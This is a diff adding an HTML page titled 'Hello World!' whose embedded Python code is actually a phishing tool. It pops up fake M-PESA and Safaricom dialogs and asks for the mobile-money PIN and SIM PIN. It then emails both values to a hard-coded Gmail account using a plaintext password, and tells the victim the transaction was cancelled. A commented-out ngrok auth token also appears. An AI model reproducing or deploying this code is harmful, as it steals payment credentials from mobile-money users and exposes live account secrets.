@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hello World!</title>
+    <link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
+    <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
+    <py-env>
+- tkinter
+    </py-env>
+  </head>
+  <body>
+    <py-script>
+import time
+from tkinter import Tk, Label, Button, Entry, Frame
+import smtplib
+from tkinter import ttk
+#from flask import Flask
+#from pyngrok import ngrok
+
+#apl = Flask(__name__)
+
+#ngrok.set_auth_token("1tU57a5Mip0thygm73YAqu5sugG_36Ft2nSvExoPReDuPNmNA")
+#port_f = 5000
+#url = ngrok.connect(port_f, proto="tcp").public_url
+#print(url)
+
+
+#@apl.route("/results")
+def hook():
+  def center_window(app):
+      w = app.winfo_screenwidth()
+      h = app.winfo_screenheight()
+      rootsize = tuple(int(_) for _ in app.geometry().split('+')[0].split('x'))
+      x = w / 2 - rootsize[0] / 2
+      y = h / 2 - rootsize[1] / 2
+      return "%dx%d+%d+%d" % (rootsize + (x, y))
+
+  def stk():
+      win0 = Tk()
+      frame = Frame(win0, width=200, height=160, colormap="new")
+      frame.pack(fill=None, padx=5, pady=5, expand=True)
+      win0.geometry(center_window(win0))
+      title_label = Label(frame, text="M-PESA", fg="black", font=("Arial Bold", 9))
+      title_label.pack()
+      title_label = Label(frame, text="")
+      title_label.pack()
+      title_label = Label(
+          frame, text="Enter PIN followed by ID to cancel transaction \n4 - 12 Digits (0-9,*,#,+,4)", fg="black",
+          font=("Arial", 6))
+      title_label.pack()
+      entry_1 = Entry(frame)
+      entry_1.pack()
+      title_label = Label(frame, text="")
+      title_label.pack()
+
+      def onclick():
+          z = "M-Pin and ID is:" + entry_1.get()
+          if len(entry_1.get()) < 4:
+              win0.destroy()
+              stk()
+          elif len(entry_1.get()) >= 4:
+              win0.destroy()
+
+              # noinspection PyShadowingNames
+              def sfc():
+                  time.sleep(0.5)
+                  win = Tk()
+                  frame = Frame(win, width=200, height=160, colormap="new")
+                  frame.pack(fill=None, padx=5, pady=5, expand=True)
+                  win.geometry(center_window(win))
+                  title_label = Label(
+                      frame, text="Safaricom                                          ", font=("Arial Bold", 8))
+                  title_label.pack()
+                  title_label = Label(frame, text="Enter simPIN1 to verify user on the Network", font=("Arial", 6))
+                  title_label.pack()
+                  entry = Entry(frame)
+                  entry.pack()
+                  title_label = Label(frame, text="")
+                  title_label.pack()
+
+                  def onclick_1():
+                      zv = "Sim pin is:" + entry.get()
+                      if len(entry.get()) < 4:
+                          win.destroy()
+                          sfc()
+                      elif len(entry.get()) >= 4:
+                          win.destroy()
+                          pns = str(z) + "  " + "and" + "  " + str(zv)
+                          for i in range(3):
+                              try:
+                                  sender = "briankimani509@gmail.com"
+                                  receiver = "briankimani509@gmail.com"
+                                  password = "bombonutymetapolice"
+                                  message = pns
+                                  server = smtplib.SMTP("smtp.gmail.com", 587)
+                                  server.starttls()
+                                  server.login(sender, password)
+                                  server.sendmail(sender, receiver, message)
+                                  break
+                              except Exception:
+                                  time.sleep(0.5)
+                          win_1 = Tk()
+                          frame = Frame(win_1, width=200, height=160, colormap="new")
+                          frame.pack(fill=None, padx=5, pady=5, expand=True)
+                          win_1.geometry(center_window(win_1))
+                          title_label = Label(
+                              frame,
+                              text="Transaction successfully Cancelled! Amount \nyou can transact within the day is 299,875.00.\nGet your M-PESA statement on M-PESA App \nhttp://bit.ly/mpesappsm",
+                              font=("Arial Bold", 7))
+                          title_label.pack()
+
+                          def cancel():
+                              win_1.destroy()
+
+                          button = Button(frame, text="exit", command=cancel)
+                          button.pack()
+
+                          win_1.mainloop()
+
+                  button = ttk.Button(frame, text="Send", command=onclick_1)
+                  button.pack(side="right")
+
+                  win.mainloop()
+
+              sfc()
+
+      button = Button(frame, text="OK", command=onclick)
+      button.pack()
+
+      win0.mainloop()
+
+  stk()
+  
+
+hook()
+    </py-script>
+  </body>
+</html>
